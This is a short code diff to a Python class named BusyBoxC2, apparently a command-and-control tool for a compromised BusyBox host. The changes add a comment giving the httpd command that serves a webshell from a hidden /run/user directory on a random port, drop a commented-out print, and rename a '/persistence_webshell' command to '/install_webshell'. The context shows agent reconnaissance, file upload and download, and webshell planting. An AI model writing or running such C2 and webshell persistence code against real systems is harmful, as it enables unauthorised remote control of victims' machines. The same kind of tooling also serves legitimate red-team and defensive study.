@@ -166,7 +166,7 @@ class BusyBoxC2:
         print("Executed cmd:" + cmd)
         self._send_cmd(cmd)
     
-        # Run webserver
+        # Run webserver (cmd: "httpd -p 8080 -c /run/user/$(id -u)/.http/httpd.conf -h /run/user/$(id -u)/.http/")
         webserver_port = random.randint(1024, 65534)
         cmd = "httpd -p " + str(webserver_port) + " -c " + webshell_destination_path + "httpd.conf -h " + webshell_destination_path
         self._send_cmd(cmd)
@@ -176,8 +176,6 @@ class BusyBoxC2:
         agent_user = self._send_cmd("echo $USER", output=False)[0].decode().split("\n", 1)[0]
         agent_hostname = self._send_cmd("hostname", output=False)[0].decode().split("\n", 1)[0]
         agent_pwd = self._send_cmd("echo $PWD", output=False)[0].decode().split("\n", 1)[0]
-
-        #print(f"user: {agent_user} | hostname: {agent_hostname} | pwd: {agent_pwd}")
 
         self.prompt = " (busybox-c2)[+] " + agent_user +  "@" + agent_hostname + ":" + agent_pwd + "> "
 
@@ -208,7 +206,7 @@ class BusyBoxC2:
                             self._download()
                         case '/upload':
                             self._upload()
-                        case '/persistence_webshell':
+                        case '/install_webshell':
                             # work only without obfuscation
                             self._install_webshell()
                         case '/load_prompt':
